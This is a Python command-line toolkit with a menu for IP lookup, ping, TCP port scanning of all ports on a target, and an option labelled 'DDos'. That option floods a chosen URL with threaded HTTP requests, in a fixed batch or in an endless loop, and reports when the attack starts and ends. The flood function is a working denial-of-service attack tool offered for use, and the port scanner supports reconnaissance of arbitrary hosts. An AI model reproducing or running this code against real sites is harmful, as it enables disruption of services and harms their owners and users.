import threading
import requests
import subprocess
import socket
from datetime import datetime
from urllib.request import urlopen
from urllib.parse import urlparse
from json import load
from random import randint
from os import system
import fade
import os
import time
import sys


def pinkred(text):
    system(""); faded = ""
    blue = 255
    for line in text.splitlines():
        faded += (f"\033[38;2;255;0;{blue}m{line}")
        if not blue == 0:
            blue -= 20
            if blue < 0:
                blue = 0
    return faded
numT = 0
numF = 0
p=pinkred
def clear():
    os.system("cls" if os.name == "nt" else "clear")



def logo(l=1):
    text=( """
    ███▄ ▄███▓ ▒█████   ▒█████   ███▄    █ ▓█████▄ ▓█████  ███▄ ▄███▓ ▒█████   ███▄    █ 
    ▓██▒▀█▀ ██▒▒██▒  ██▒▒██▒  ██▒ ██ ▀█   █ ▒██▀ ██▌▓█   ▀ ▓██▒▀█▀ ██▒▒██▒  ██▒ ██ ▀█   █ 
    ▓██    ▓██░▒██░  ██▒▒██░  ██▒▓██  ▀█ ██▒░██   █▌▒███   ▓██    ▓██░▒██░  ██▒▓██  ▀█ ██▒
    ▒██    ▒██ ▒██   ██░▒██   ██░▓██▒  ▐▌██▒░▓█▄   ▌▒▓█  ▄ ▒██    ▒██ ▒██   ██░▓██▒  ▐▌██▒
    ▒██▒   ░██▒░ ████▓▒░░ ████▓▒░▒██░   ▓██░░▒████▓ ░▒████▒▒██▒   ░██▒░ ████▓▒░▒██░   ▓██░
    ░ ▒░   ░  ░░ ▒░▒░▒░ ░ ▒░▒░▒░ ░ ▒░   ▒ ▒  ▒▒▓  ▒ ░░ ▒░ ░░ ▒░   ░  ░░ ▒░▒░▒░ ░ ▒░   ▒ ▒ 
    ░  ░      ░  ░ ▒ ▒░   ░ ▒ ▒░ ░ ░░   ░ ▒░ ░ ▒  ▒  ░ ░  ░░  ░      ░  ░ ▒ ▒░ ░ ░░   ░ ▒░
    ░      ░   ░ ░ ░ ▒  ░ ░ ░ ▒     ░   ░ ░  ░ ░  ░    ░   ░      ░   ░ ░ ░ ▒     ░   ░ ░ 
        ░       ░ ░      ░ ░           ░    ░       ░  ░       ░       ░ ░           ░ 
                                            ░                                            """)
    text=fade.pinkred(text)
    print(text)

def DDos(url, reque=0, sleep=0, wwhile="n"):
    def make_request(url):
        global numT, numF
        try:
            response = requests.get(url)
            if response.status_code == 200:
                print(f"\033[92m{response.status_code}")
                numT += 1
            else:
                print(f"\033[91m{response.status_code}")
                numF += 1
        except Exception as e:
            print(f"\033[91mError: {e}")

    def make_while_request(url):
        time.sleep(sleep)
        global numT, numF
        try:
            response = requests.get(url)
            if response.status_code == 200:
                print(f"\033[92m{response.status_code}")
                numT += 1
            else:
                print(f"\033[91m{response.status_code}")
                numF += 1
        except Exception as e:
            print(f"\033[91mError: {e}")
            print(f"\n\033[92mTrue: {numT}\n\033[91mFalse: {numF}")
    
    if wwhile.lower()=="n":
        threads = []
        print("Attack started at:" + str(datetime.now()))
        for _ in range(reque):
            try:
                t = threading.Thread(target=make_request, args=(url,))
                time.sleep(sleep) 
                threads.append(t)
                t.start()
            except Exception as e:
                print(f"\033[91mError creating thread: {e}")

        for t in threads:
            t.join()
        print("Attack finished at:" + str(datetime.now()))
        print(f"\n\033[92mTrue: {numT}\n\033[91mFalse: {numF}")
    elif wwhile.lower()=="y":
        threads = []
        time.sleep(1)
        print("Attack started at:" + str(datetime.now()))
        while True:
            try:
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                t = threading.Thread(target=make_while_request, args=(url,))
                time.sleep(sleep) 
                threads.append(t)
                t.start()
            except Exception as e:
                print("Attack finished at:" + str(datetime.now()))
                print(f"\033[91mError creating thread: {e}")
    else:
         print("IndexError")





def portscan(target):
	print("Scanning Target: " + target)
	print("Scanning started at:" + str(datetime.now()))
	try:
		for port in range(1,65535):
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			socket.setdefaulttimeout(1)
			result = s.connect_ex((target,port))
			if result ==0:
				print("Port {} is open".format(port))
			s.close()
	except socket.gaierror:
			print("\n Hostname Could Not Be Resolved !!!!")
	except socket.error:
			print("\n Server not responding !!!!")



def ping(hostname, num_requests, sleep=0.3):
    print("Scanning Target: " + hostname)
    print("started at:" + str(datetime.now()))
    sucess = 1
    for _ in range(num_requests):
        try:
            ping_response = subprocess.Popen(["ping", hostname, "-n", "1"], stdout=subprocess.PIPE).stdout.read()
            ping_response = ping_response.decode('cp866', errors='ignore')

            try:
                ping_time = int(ping_response.split(' ')[-2])
                print(f"\rsend {sucess}/{num_requests} ping: {ping_time} ms ", end="", flush=True)
                sucess += 1
            except (ValueError, IndexError) as e:
                print(f"\rError parsing ping response: {e}", end="", flush=True)

            time.sleep(sleep)
        except Exception as e:
            print(f"\033[91m\rError sending ping: {e}", end="", flush=True)

    print("\nfinished at:", str(datetime.now()),  end="", flush=True)
    print(f"\n{sucess - 1}/{num_requests} successfully sent")

def ipInfo(addr=''):
    if addr.startswith("http://") or addr.startswith("https://"):
        parsed_url = urlparse(addr)
        addr = parsed_url.netloc
    try:
        socket.inet_aton(addr)
        url = f'https://ipinfo.io/{addr}/json'
    except socket.error:
        try:
            ip_address = socket.gethostbyname(addr)
            url = f'https://ipinfo.io/{ip_address}/json'
        except socket.gaierror as e:
            print(f"\033[91mError resolving domain: {e}")
            return

    try:
        res = urlopen(url)
        data = load(res)
        for attr in data.keys():
            print(attr, ' ' * 13 + '\t\033[33m->\033[0m\t', data[attr])
    except Exception as e:
        print(f"\033[91mError fetching IP information: {e}")

def Menu():
    clear()
    logo()
    txt=print(fade.purplepink(f"""         .          .           .     .                .       .
        .      .      *    {p("① ip info")}          .       .          .                       .
                        .       . {p("② ping")}  . *            
        .       ____     .      . .   {p("③ scan port")}       .        .        .               .
        .   .  /WWWI; \  .              ____     {p("④ DDos")}.                      .         .     .         
        *    /WWWWII; \=====;    .     /WI; \                ./\_ {p("⑤ Exit")}            .
        .   /WWWWWII;..      \_  . ___/WI;:. \     .        _/M; \    .   .         .
            /WWWWWIIIIi;..      \__/WWWIIII:.. \____ .   .  /MMI:  \   * .
        . _/WWWWWIIIi;;;:...:   ;\WWWWWWIIIII;.     \     /MMWII;   \    .  .     .
        /WWWWWIWIiii;;;.:.. :   ;\WWWWWIII;;;::     \___/MMWIIII;   \              .
        /WWWWWIIIIiii;;::.... :   ;|WWWWWWII;;::.:      :;IMWIIIII;:   \___     *
        /WWWWWWWWWIIIIIWIIii;;::;..;\WWWWWWIII;;;:::...    ;IMIII;;     ::  \     .
        WWWWWWWWWIIIIIIIIIii;;::.;..;\WWWWWWWWIIIII;;..  :;IMIII;:::     :    \   
        WWWWWWWWWWWWWIIIIIIii;;::..;..;\WWWWWWWWIIII;::; :::::::::.....::       \

        %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%XXXXXXXXXX
        %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%XXXXXXXXXXXXX
        %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%XXXXXXXXXXXXXXXXX
        %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%XXXXXXXXXXXXXXXXXXXX"""))
    try:
        try:
            option = int(input("     Select option: "))
        except Exception as e:
            print(f"\033[91mError: {e}")
            print("\033[91mInvalid input. Please enter a number.")
    except Exception as e:
            print(f"\033[91mError: {e}")
    if option == 1:
        clear()
        logo()
        addr = input("Input IP or domain: ")
        ipInfo(addr)
        input("\033[95mPress ENTER to continue\033[0m")
    elif option == 2:
        clear()
        logo()
        try:
            hostname=str(input("input ip to ping:"))
            num_requests = int(input("Input number of requests: "))
        except Exception as e:
            print(f"\033[91mError: {e}")
            return
        clear()
        logo()
        ping(hostname, num_requests)
        input("\033[95mPress ENTER to continue\033[0m")
    elif option == 3:
        clear()
        logo()
        target=input("target: ")
        clear()
        logo()
        portscan(target)
    elif option == 4:
        clear()
        logo()
        reque=0
        try:
            url=str(input("Input IP or domain for DDos: "))
            wwhile=str(input("while? [Y/n]: "))
            try:
                if wwhile.lower()=="n":
                    try:
                        reque = int(input("Input number of requests: "))
                        sleep = float(input("Input sleep between requests: "))
                    except Exception as e:
                        print(f"\033[91mError: {e}")
                        print("\033[91mInvalid input. Please enter a valid number.")
                        return
                elif wwhile.lower()=="y":
                    try:
                        sleep = float(input("Input sleep between requests: "))
                    except Exception as e:
                        print(f"\033[91mError: {e}")
                        print("\033[91mInvalid input. Please enter a valid number.")
            except Exception as e:
                print(f"\033[91mError: {e}")
        except Exception as e:
            print(f"\033[91mError: {e}")
        DDos(url, reque, sleep, wwhile)
        input("\033[95mPress ENTER to continue\033[0m")
    elif option == 5:
        clear()
        logo()
        print("\033[91mExiting the program.\033[0m")
        input("\033[95mPress ENTER to exit\033[0m")
        sys.exit()



if __name__ == "__main__":
    while True:
        Menu()
